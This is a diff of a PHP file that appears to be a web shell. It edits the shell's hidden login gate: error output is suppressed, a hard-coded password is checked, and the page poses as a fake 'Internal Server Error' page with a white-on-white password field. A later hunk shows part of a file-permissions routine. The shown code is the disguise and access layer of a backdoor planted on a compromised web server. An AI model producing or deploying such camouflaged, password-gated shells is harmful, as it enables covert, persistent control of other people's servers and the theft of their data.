@@ -1,51 +1,35 @@
 <?php
 
 error_reporting(0);
-header('HTTP/1.0 404 Not Found', true, 404);
 session_start();
 $pass = "erorr";
-$link = "url.txt";
 if($_POST['password'] == $pass) {
   $_SESSION['forbidden'] = $pass;
-  echo "<script>window.location='?ket'</script>";
-}
-if($_GET['page'] == "blank") {
-  echo "<a href='?'>Back</a>";
-  exit();
 }
 if(isset($_REQUEST['logout'])) {
   session_destroy();
-  echo "<script>window.location='?ket'</script>";
 }
 if(!($_SESSION['forbidden'])) {
+  
 ?>
+
 <html>
-<head>
-	<title>500 Internal Server Error</title>
-</head>
-<style>
+  <head>
+    <title>Internal Server Error</title>
+    </head>
+    <style>
 	input { margin:0;background-color:#fff;border:1px solid #fff; }
-</style>
+	</style>
 	<center><form method="post">
-		<input type="password" name="password" placeholder=".">
-      <input type="submit" value="."></center>
-		<br>
-		<br>
-		<?php echo $_SESSIOM['forbidden']; ?>
-	    </form>
-	  </td>
-	 </table>
-
-<?php 
-
-exit();
+	  <input type="password" name="password" placeholder="">
+	  <input type="submit" value=""></center>
+	  <?php
+	  exit();
 }
- ?>
+?>
+
 <?php
- 
-error_reporting(0); 
-session_start();
- 
+
 if(get_magic_quotes_gpc()){
 foreach($_POST as $key=>$value){
 $_POST[$key] = stripslashes($value);
@@ -398,6 +382,8 @@ $info .= (($perms & 0x0001) ?
  
 return $info;
 }
+?>
+<?php
 ?>
 <center>
 <br>
